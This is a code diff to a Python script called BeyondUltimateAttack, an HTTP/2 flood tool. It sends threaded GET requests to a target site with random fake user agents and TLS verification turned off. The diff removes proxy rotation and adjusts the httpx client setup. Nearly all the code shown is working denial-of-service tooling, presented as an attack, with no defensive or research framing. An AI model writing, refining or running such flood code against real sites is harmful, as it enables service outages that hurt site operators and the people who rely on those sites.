@@ -2,9 +2,7 @@ import random
 import requests
 from fake_useragent import UserAgent
 import threading
-import time
-import ssl
-from httpx import Client
+import httpx
 
 class BeyondUltimateAttack:
     def __init__(self, target):
@@ -16,13 +14,10 @@ class BeyondUltimateAttack:
         ]
         self.ua = UserAgent()
         self.max_threads = 100  
-        self.http_client = Client(http2=True, verify=False)  
+        self.http_client = httpx.Client(http2=True, verify=False)  
 
     def get_random_user_agent(self):
         return self.ua.random
-
-    def rotate_proxy(self):
-        return random.choice(self.proxies)
 
     def generate_headers(self):
         return {
@@ -44,10 +39,8 @@ class BeyondUltimateAttack:
 
     def send_http2_flood(self):
         headers = self.generate_headers()
-        proxies = {'http://': self.rotate_proxy(), 'https://': self.rotate_proxy()}
-
         try:
-            response = self.http_client.get(self.target, headers=headers, proxies=proxies, timeout=10)
+            response = self.http_client.get(self.target, headers=headers, timeout=10)
             print(f"HTTP/2 Flood Sent: {response.status_code}")
         except Exception as e:
             print(f"Request Failed: {str(e)}")
